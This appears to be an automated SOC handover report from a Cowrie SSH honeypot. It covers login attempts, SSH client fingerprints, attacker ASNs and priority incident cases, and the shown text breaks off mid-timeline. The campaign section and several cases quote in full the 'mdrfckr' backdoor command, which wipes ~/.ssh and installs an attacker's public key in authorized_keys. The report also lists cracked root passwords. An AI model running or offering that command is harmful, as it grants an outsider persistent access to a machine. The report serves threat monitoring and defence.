# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-29 |
| **Generated At** | 2026-05-29T08:05:33Z |
| **Shift Time** | 08:05 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **215** |
| Confirmed Threats | **185** |
| False Positives Filtered | **30** (14.0%) |
| Unique Attacker IPs | **35** |
| Countries of Origin | **16** |
| High Severity Cases | **14** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **201** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **43** |
| Unique Credential Pairs | **25** |
| Unique Usernames | **16** |
| Unique Passwords | **24** |
| Successful Auth Pairs | **11** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 14 |
| `345gs5662d34` | 7 |
| `GET / HTTP/1.1` | 4 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | 2 |
| `*1` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |
| `Host: 13.235.92.17:23` | 2 |
| `Accept-Encoding: gzip` | 2 |
| `$4` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 2 |
| `*1` | `$4` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Aa@12345` | `183.81.86.112` | 2026-05-29T04:03:05 |
| `root` | `3245gs5662d34` | `183.81.86.112` | 2026-05-29T04:03:08 |
| `root` | `bangsat` | `177.11.196.79` | 2026-05-29T04:37:52 |
| `root` | `Root1234!` | `102.88.137.213` | 2026-05-29T04:37:52 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-05-29T04:37:59 |
| `root` | `3245gs5662d34` | `177.11.196.79` | 2026-05-29T04:38:00 |
| `root` | `.` | `102.88.137.213` | 2026-05-29T04:39:43 |
| `root` | `admin@1234` | `102.88.137.213` | 2026-05-29T04:43:19 |
| `root` | `Ab123123` | `102.88.137.213` | 2026-05-29T04:47:02 |
| `root` | `123qwe,./` | `179.33.210.213` | 2026-05-29T06:01:05 |
| `root` | `3245gs5662d34` | `179.33.210.213` | 2026-05-29T06:01:12 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **215** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 33 |
| Go SSH scanner | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 30 | 5 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 30 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `bc3aee897af7...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `177.11.196.79`, `179.33.210.213`, `102.88.137.213`, `183.81.86.112`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **35** |
| Unique ASNs | **27** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS209334` | Modat B.V. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS396982` | Google LLC | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS18403` | FPT Telecom Company | 2 | HIGH |
| `AS56045` | China Mobile communications corporation | 1 | HIGH |
| `AS211298` | Driftnet Ltd | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (14)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-321f5ea5da63

| Field | Detail |
|---|---|
| **Source IP** | `183.81.86[.]112` |
| **First Seen** | 2026-05-29 04:03 |
| **Last Seen** | 2026-05-29 04:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 04:03:05` | `cowrie.session.connect` |
| `2026-05-29 04:03:05` | `cowrie.client.version` |
| `2026-05-29 04:03:05` | `cowrie.client.kex` |
| `2026-05-29 04:03:05` | `cowrie.login.success` |
| `2026-05-29 04:03:05` | `cowrie.session.params` |
| `2026-05-29 04:03:05` | `cowrie.command.input` |
| `2026-05-29 04:03:05` | `cowrie.command.failed` |
| `2026-05-29 04:03:06` | `cowrie.log.closed` |
| `2026-05-29 04:03:06` | `cowrie.session.params` |
| `2026-05-29 04:03:06` | `cowrie.command.input` |
| `2026-05-29 04:03:06` | `cowrie.session.file_download` |
| `2026-05-29 04:03:06` | `cowrie.log.closed` |
| `2026-05-29 04:03:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.86[.]112` to AbuseIPDB if not already reported
- [ ] Block `183.81.86[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9049da4c94b7

| Field | Detail |
|---|---|
| **Source IP** | `183.81.86[.]112` |
| **First Seen** | 2026-05-29 04:03 |
| **Last Seen** | 2026-05-29 04:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 04:03:08` | `cowrie.session.connect` |
| `2026-05-29 04:03:08` | `cowrie.client.version` |
| `2026-05-29 04:03:08` | `cowrie.client.kex` |
| `2026-05-29 04:03:08` | `cowrie.login.success` |
| `2026-05-29 04:03:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.81.86[.]112` to AbuseIPDB if not already reported
- [ ] Block `183.81.86[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7a17227ab3a

| Field | Detail |
|---|---|
| **Source IP** | `177.11.196[.]79` |
| **First Seen** | 2026-05-29 04:37 |
| **Last Seen** | 2026-05-29 04:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 04:37:50` | `cowrie.session.connect` |
| `2026-05-29 04:37:50` | `cowrie.client.version` |
| `2026-05-29 04:37:50` | `cowrie.client.kex` |
| `2026-05-29 04:37:52` | `cowrie.login.success` |
| `2026-05-29 04:37:53` | `cowrie.session.params` |
| `2026-05-29 04:37:53` | `cowrie.command.input` |
| `2026-05-29 04:37:53` | `cowrie.command.failed` |
| `2026-05-29 04:37:53` | `cowrie.log.closed` |
| `2026-05-29 04:37:54` | `cowrie.session.params` |
| `2026-05-29 04:37:54` | `cowrie.command.input` |
| `2026-05-29 04:37:54` | `cowrie.session.file_download` |
| `2026-05-29 04:37:54` | `cowrie.log.closed` |
| `2026-05-29 04:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.11.196[.]79` to AbuseIPDB if not already reported
- [ ] Block `177.11.196[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-957fedbf60c3

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-29 04:37 |
| **Last Seen** | 2026-05-29 04:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 04:37:51` | `cowrie.session.connect` |
| `2026-05-29 04:37:51` | `cowrie.client.version` |
| `2026-05-29 04:37:51` | `cowrie.client.kex` |
| `2026-05-29 04:37:52` | `cowrie.login.success` |
| `2026-05-29 04:37:53` | `cowrie.session.params` |
| `2026-05-29 04:37:53` | `cowrie.command.input` |
| `2026-05-29 04:37:53` | `cowrie.command.failed` |
| `2026-05-29 04:37:54` | `cowrie.log.closed` |
| `2026-05-29 04:37:54` | `cowrie.session.params` |
| `2026-05-29 04:37:54` | `cowrie.command.input` |
| `2026-05-29 04:37:54` | `cowrie.session.file_download` |
| `2026-05-29 04:37:54` | `cowrie.log.closed` |
| `2026-05-29 04:37:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ae2075dc2bf

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-29 04:37 |
| **Last Seen** | 2026-05-29 04:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 04:37:58` | `cowrie.session.connect` |
| `2026-05-29 04:37:58` | `cowrie.client.version` |
| `2026-05-29 04:37:58` | `cowrie.client.kex` |
| `2026-05-29 04:37:59` | `cowrie.login.success` |
| `2026-05-29 04:37:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c825b97fea25

| Field | Detail |
|---|---|
| **Source IP** | `177.11.196[.]79` |
| **First Seen** | 2026-05-29 04:37 |
| **Last Seen** | 2026-05-29 04:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 04:37:58` | `cowrie.session.connect` |
| `2026-05-29 04:37:58` | `cowrie.client.version` |
| `2026-05-29 04:37:59` | `cowrie.client.kex` |
| `2026-05-29 04:38:00` | `cowrie.login.success` |
| `2026-05-29 04:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.11.196[.]79` to AbuseIPDB if not already reported
- [ ] Block `177.11.196[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad14da25ae92

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-29 04:39 |
| **Last Seen** | 2026-05-29 04:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 04:39:42` | `cowrie.session.connect` |
| `2026-05-29 04:39:42` | `cowrie.client.version` |
| `2026-05-29 04:39:42` | `cowrie.client.kex` |
| `2026-05-29 04:39:43` | `cowrie.login.success` |
| `2026-05-29 04:39:44` | `cowrie.session.params` |
| `2026-05-29 04:39:44` | `cowrie.command.input` |
| `2026-05-29 04:39:44` | `cowrie.command.failed` |
| `2026-05-29 04:39:44` | `cowrie.log.closed` |
| `2026-05-29 04:39:45` | `cowrie.session.params` |
| `2026-05-29 04:39:45` | `cowrie.command.input` |
| `2026-05-29 04:39:45` | `cowrie.session.file_download` |
| `2026-05-29 04:39:45` | `cowrie.log.closed` |
| `2026-05-29 04:39:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df0a563af2e5

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-29 04:39 |
| **Last Seen** | 2026-05-29 04:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 04:39:49` | `cowrie.session.connect` |
| `2026-05-29 04:39:49` | `cowrie.client.version` |
| `2026-05-29 04:39:49` | `cowrie.client.kex` |
| `2026-05-29 04:39:50` | `cowrie.login.success` |
| `2026-05-29 04:39:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d74b112659c

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-29 04:43 |
| **Last Seen** | 2026-05-29 04:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 04:43:17` | `cowrie.session.connect` |
| `2026-05-29 04:43:17` | `cowrie.client.version` |
| `2026-05-29 04:43:18` | `cowrie.client.kex` |
| `2026-05-29 04:43:19` | `cowrie.login.success` |
| `2026-05-29 04:43:19` | `cowrie.session.params` |
| `2026-05-29 04:43:19` | `cowrie.command.input` |
| `2026-05-29 04:43:19` | `cowrie.command.failed` |
| `2026-05-29 04:43:20` | `cowrie.log.closed` |
| `2026-05-29 04:43:20` | `cowrie.session.params` |
| `2026-05-29 04:43:20` | `cowrie.command.input` |
| `2026-05-29 04:43:21` | `cowrie.session.file_download` |
| `2026-05-29 04:43:21` | `cowrie.log.closed` |
| `2026-05-29 04:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80d34fecd550

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-29 04:43 |
| **Last Seen** | 2026-05-29 04:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 04:43:24` | `cowrie.session.connect` |
| `2026-05-29 04:43:24` | `cowrie.client.version` |
| `2026-05-29 04:43:24` | `cowrie.client.kex` |
| `2026-05-29 04:43:26` | `cowrie.login.success` |
| `2026-05-29 04:43:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec6774dc2011

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-29 04:47 |
| **Last Seen** | 2026-05-29 04:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 04:47:00` | `cowrie.session.connect` |
| `2026-05-29 04:47:00` | `cowrie.client.version` |
| `2026-05-29 04:47:00` | `cowrie.client.kex` |
| `2026-05-29 04:47:02` | `cowrie.login.success` |
| `2026-05-29 04:47:02` | `cowrie.session.params` |
| `2026-05-29 04:47:02` | `cowrie.command.input` |
| `2026-05-29 04:47:02` | `cowrie.command.failed` |
| `2026-05-29 04:47:03` | `cowrie.log.closed` |
| `2026-05-29 04:47:03` | `cowrie.session.params` |
| `2026-05-29 04:47:03` | `cowrie.command.input` |
| `2026-05-29 04:47:04` | `cowrie.session.file_download` |
| `2026-05-29 04:47:04` | `cowrie.log.closed` |
| `2026-05-29 04:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79f942f0c5af

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-29 04:47 |
| **Last Seen** | 2026-05-29 04:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 04:47:07` | `cowrie.session.connect` |
| `2026-05-29 04:47:07` | `cowrie.client.version` |
| `2026-05-29 04:47:07` | `cowrie.client.kex` |
| `2026-05-29 04:47:09` | `cowrie.login.success` |
| `2026-05-29 04:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ce2184febad

| Field | Detail |
|---|---|
| **Source IP** | `179.33.210[.]213` |
| **First Seen** | 2026-05-29 06:01 |
| **Last Seen** | 2026-05-29 06:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 06:01:04` | `cowrie.session.connect` |
| `2026-05-29 06:01:04` | `cowrie.client.version` |
| `2026-05-29 06:01:04` | `cowrie.client.kex` |
| `2026-05-29 06:01:05` | `cowrie.login.success` |
| `2026-05-29 06:01:06` | `cowrie.session.params` |
| `2026-05-29 06:01:06` | `cowrie.command.input` |
